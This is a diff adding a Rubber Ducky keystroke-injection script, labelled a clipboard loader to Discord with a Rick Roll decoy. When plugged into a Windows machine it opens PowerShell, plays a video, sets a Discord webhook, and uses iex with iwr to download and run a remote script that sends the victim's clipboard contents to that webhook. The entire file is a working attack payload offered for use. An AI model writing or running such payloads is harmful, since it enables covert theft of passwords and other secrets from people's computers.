@@ -1,0 +1,15 @@
+REM Clipboard loader to Discord & Rick Roll - VISIBLE
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell 
+ENTER
+STRING Start-Process 'https://streamable.com/lf027o'
+ENTER
+DELAY 1000
+STRING $webhookUrl = 'INPUT YOUR DISCORD WEBHOOK HERE'
+ENTER
+DELAY 1000
+STRING iex (iwr 'https://raw.githubusercontent.com/ash-indigo/RubberDucky/main/Clipboard%20to%20Discord/send-clipboard-to-discord.ps1' -UseBasicParsing)
+ENTER
